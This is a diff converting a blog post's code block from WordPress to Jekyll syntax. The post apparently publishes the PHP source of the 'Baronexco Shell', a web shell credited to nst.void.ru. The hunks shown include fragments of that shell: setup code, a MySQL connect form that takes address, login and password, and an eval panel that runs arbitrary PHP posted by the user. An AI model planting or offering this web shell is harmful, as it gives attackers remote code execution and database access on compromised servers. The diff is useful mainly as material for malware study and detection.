@@ -14,7 +14,7 @@ I don&#8217;t know what this script is called, but the default password seems to
 
 ### Baronexco Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?
+{% highlight php %}<?
 @session_start();
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
@@ -386,7 +386,7 @@ if(!isset($from)){$from=0;}
 if(!isset($to)){$to=50;}
 
 
-?&gt;
+?>
 &lt;style&gt;
 table,td{
 color: black;
@@ -396,20 +396,20 @@ font-size: 11px;
 }
 &lt;/style&gt;
 &lt;font color=black face=verdana size=1&gt;
-&lt;? if(!$conn){ ?&gt;
+<? if(!$conn){ ?>
 
 &lt;!-- table 1 --&gt;
 &lt;table bgcolor=#D7FFA8&gt;
-&lt;tr&gt;&lt;td valign=top&gt;Address:&lt;/td&gt;&lt;td&gt;&lt;form&gt;&lt;input name=adress value='&lt;?=$adress?&gt;' size=20&gt;&lt;input name=port value='&lt;?=$port?&gt;' size=6&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;Td valign=top&gt;Login: &lt;/td&gt;&lt;td&gt;&lt;input name=login value='&lt;?=$login?&gt;' size=10&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;Td valign=top&gt;Pass:&lt;/td&gt;&lt;td&gt; &lt;input name=pass value='&lt;?=$pass?&gt;' size=10&gt;&lt;input type=hidden name=p value=sql&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=conn value=Connect&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;?}?&gt;
-&lt;tr&gt;&lt;td valign=top&gt;&lt;? if($conn){ echo "&lt;b&gt;PHP v".@phpversion()."&lt;br&gt;mySQL v".@mysql_get_server_info()."&lt;br&gt;";}?&gt;&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=top&gt;Address:&lt;/td&gt;&lt;td&gt;&lt;form&gt;&lt;input name=adress value='<?=$adress?>' size=20&gt;&lt;input name=port value='<?=$port?>' size=6&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;Td valign=top&gt;Login: &lt;/td&gt;&lt;td&gt;&lt;input name=login value='<?=$login?>' size=10&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;Td valign=top&gt;Pass:&lt;/td&gt;&lt;td&gt; &lt;input name=pass value='<?=$pass?>' size=10&gt;&lt;input type=hidden name=p value=sql&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=conn value=Connect&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;<?}?>
+&lt;tr&gt;&lt;td valign=top&gt;<? if($conn){ echo "&lt;b&gt;PHP v".@phpversion()."&lt;br&gt;mySQL v".@mysql_get_server_info()."&lt;br&gt;";}?>&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;/table&gt;
 &lt;!-- end of table 1 --&gt;
 
 
-&lt;?
+<?
 $conn=$_GET['conn'];
 $adress=$_GET['adress'];
 $port=$_GET['port'];
@@ -1730,9 +1730,9 @@ print "
 &lt;b&gt;eval:&lt;/b&lt;br&gt;
 (example: print \"Hello World\";)
 &lt;form method=post&gt;
-&lt;font color=red&gt;&lt;b&gt;&lt;?&lt;/b&gt;&lt;br&gt;
+&lt;font color=red&gt;&lt;b&gt;<?&lt;/b&gt;&lt;br&gt;
 &lt;textarea name=eval rows=15 cols=113&gt;&lt;/textarea&gt;&lt;br&gt;
-&lt;b&gt;?&gt;&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
+&lt;b&gt;?>&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
 &lt;input type=submit value=Run style='width:150px;'&gt;
 &lt;/form&gt;&lt;br&gt;
 ";
@@ -1751,11 +1751,11 @@ eval(eval_sl($_POST['eval']));
 print "&lt;br&gt;&lt;br&gt;";
 
 print "&lt;font color=green&gt;&lt;b&gt;PHP:&lt;/b&gt;&lt;br&gt;\r\n\r\n";
-print "&lt;?\r\n";
+print "<?\r\n";
 print "&lt;br&gt;";
 print htmlspecialchars(eval_sl(($_POST['eval'])));
 print "&lt;br&gt;";
-print "?&gt;\r\n\r\n&lt;/font&gt;&lt;br&gt;&lt;br&gt;";
+print "?>\r\n\r\n&lt;/font&gt;&lt;br&gt;&lt;br&gt;";
 
 }
 
@@ -2148,6 +2148,6 @@ echo "&lt;tr&gt;&lt;td bgcolor=$color&gt;&lt;font face=wingdings size=3&gt;2&lt;
 echo "&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
 echo $copyr;
 
-?&gt;
+?>
 &lt;!-- Network security team :: nst.void.ru --&gt;
-</pre>
+{% endhighlight %}
